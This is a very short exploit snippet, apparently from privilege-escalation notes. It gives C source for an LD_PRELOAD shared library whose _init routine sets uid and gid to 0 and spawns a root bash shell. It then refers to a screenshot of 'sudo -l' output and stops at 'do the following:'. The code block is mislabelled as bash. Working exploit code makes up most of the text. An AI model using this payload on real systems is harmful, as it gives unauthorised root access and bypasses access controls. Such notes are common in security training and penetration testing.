```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

```


![image](https://user-images.githubusercontent.com/96658935/147622984-7193ceee-663b-4649-b16c-65016f201af4.png)


Whne you run sudo -l and see this output do the following:
